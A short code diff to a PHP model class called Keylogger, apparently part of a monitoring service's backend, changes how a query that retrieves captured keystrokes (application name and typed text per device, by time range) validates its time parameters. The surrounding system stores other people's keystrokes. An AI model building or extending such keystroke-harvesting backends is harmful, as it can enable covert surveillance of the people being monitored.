@@ -30,7 +30,7 @@ class Keylogger extends BaseModel {
 
         $select = "SELECT `timestamp`, `app_name`, `text`";
 
-        if (isset($params['timeFrom'], $params['timeTo'])) {
+        if ($params['timeFrom'] > 0 && $params['timeTo'] > 0) {
             $timeFrom = $this->getDb()->quote($params['timeFrom']);
             $timeTo = $this->getDb()->quote($params['timeTo']);
             $fromWhere = "FROM `keylogger` WHERE `dev_id` = {$devId} AND `timestamp` >= {$timeFrom} AND `timestamp` <= {$timeTo}";
